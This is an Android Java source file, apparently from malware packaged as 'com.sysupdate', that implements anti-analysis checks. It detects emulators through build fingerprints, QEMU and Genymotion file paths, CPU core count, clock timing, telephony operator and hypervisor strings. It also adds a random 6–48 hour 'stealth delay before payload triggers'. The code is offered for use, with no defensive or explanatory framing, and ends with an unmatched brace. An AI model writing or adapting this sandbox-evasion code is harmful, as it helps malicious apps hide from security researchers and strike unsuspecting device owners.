package com.sysupdate;

import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.SystemClock;
import android.telephony.TelephonyManager;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;

public class AntiDetect {

    // ── Build fingerprint / model checks ─────────────────────────────────────
    private static boolean isEmulatorBuild() {
        return Build.FINGERPRINT.startsWith("generic")
            || Build.FINGERPRINT.contains("test-keys")
            || Build.MODEL.contains("google_sdk")
            || Build.MODEL.contains("Emulator")
            || Build.MODEL.contains("Android SDK built for x86")
            || Build.MANUFACTURER.contains("Genymotion")
            || Build.HARDWARE.contains("goldfish")
            || Build.HARDWARE.contains("ranchu")
            || Build.PRODUCT.startsWith("sdk")
            || Build.PRODUCT.contains("vbox")
            || Build.BOARD.equals("QC_Reference_Phone")
            || "google_sdk".equals(Build.PRODUCT);
    }

    // ── Emulator-specific file paths ─────────────────────────────────────────
    private static boolean hasEmulatorFiles() {
        String[] paths = {
            "/dev/socket/qemud",
            "/dev/qemu_pipe",
            "/system/lib/libc_malloc_debug_qemu.so",
            "/sys/qemu_trace",
            "/system/bin/qemu-props",
            "/dev/socket/genyd",
            "/dev/socket/baseband_genyd",
            "/dev/goldfish_pipe"
        };
        for (String p : paths) {
            if (new File(p).exists()) return true;
        }
        return false;
    }

    // ── CPU core count heuristic ──────────────────────────────────────────────
    private static boolean suspiciousCores() {
        return Runtime.getRuntime().availableProcessors() < 2;
    }

    // ── Clock granularity timing attack ───────────────────────────────────────
    private static boolean suspiciousTiming() {
        long t1 = SystemClock.elapsedRealtimeNanos();
        long t2 = SystemClock.elapsedRealtimeNanos();
        return (t2 - t1) == 0L;
    }

    // ── IMEI / operator checks (emulators return null/empty) ─────────────────
    private static boolean suspiciousTelephony(Context ctx) {
        try {
            TelephonyManager tm = (TelephonyManager)
                ctx.getSystemService(Context.TELEPHONY_SERVICE);
            if (tm == null) return true;
            String op = tm.getNetworkOperatorName();
            return op == null || op.isEmpty()
                || op.equalsIgnoreCase("android")
                || op.equalsIgnoreCase("unknown");
        } catch (Exception e) {
            return true;
        }
    }

    // ── /proc/cpuinfo — check for hypervisor strings ─────────────────────────
    private static boolean hasHypervisorCpu() {
        try (BufferedReader br = new BufferedReader(
                new FileReader("/proc/cpuinfo"))) {
            String line;
            while ((line = br.readLine()) != null) {
                if (line.toLowerCase().contains("hypervisor")
                 || line.toLowerCase().contains("qemu")
                 || line.toLowerCase().contains("vmware")) {
                    return true;
                }
            }
        } catch (IOException ignored) {}
        return false;
    }

    // ── Master gate ───────────────────────────────────────────────────────────
    public static boolean isSafe(Context ctx) {
        return !isEmulatorBuild()
            && !hasEmulatorFiles()
            && !suspiciousCores()
            && !suspiciousTiming()
            && !suspiciousTelephony(ctx)
            && !hasHypervisorCpu();
    }

    // ── Stealth delay: 6–48h random sleep before payload triggers ─────────────
    public static void stealthDelay() throws InterruptedException {
        long min = 6L  * 60 * 60 * 1000;
        long max = 48L * 60 * 60 * 1000;
        long delay = min + (long)(Math.random() * (max - min));
        Thread.sleep(delay);
    }
                }
